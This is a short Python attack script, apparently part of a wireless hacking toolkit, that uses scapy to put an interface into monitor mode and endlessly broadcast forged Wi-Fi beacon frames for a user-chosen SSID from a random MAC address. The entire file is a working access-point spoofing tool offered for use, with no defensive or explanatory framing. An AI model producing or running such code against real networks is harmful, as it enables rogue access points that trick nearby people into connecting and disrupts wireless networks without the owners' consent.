import os
from scapy.all import *

from mod.system.system_config.iface_control import *
from mod.system.system_config.mac_gen import mac_maker

def send_beacon(ssid, mac, iface):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # beacon layer
    beacon = Dot11Beacon()
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=iface, loop=1)

def atk():
    print("\n\n")
    os.system("ifconfig")
    iface = input("enter interface: ")
    ssid = input("enter ssid to broadcast: ")
    
    print("putting "+iface+" into monitor mode...")
    iface = put_into_monitor(iface)
    print("generating mac...")
    mac = RandMAC()

    print("[SSID] "+ssid)
    print("[IFACE] "+iface)
    print("[MAC] "+str(mac))

    print("starting broadcast, press CTRL+C to stop...")
    try:
        while True:
            print("sennding "+ssid+" beacon with "+str(mac)+" mac")
            send_beacon(ssid, mac, iface)
    except KeyboardInterrupt:
        print("[!] stopping...")
        print("putting interrface into managed mode...")
        put_into_managed(iface)
        print("[!] exting...")

    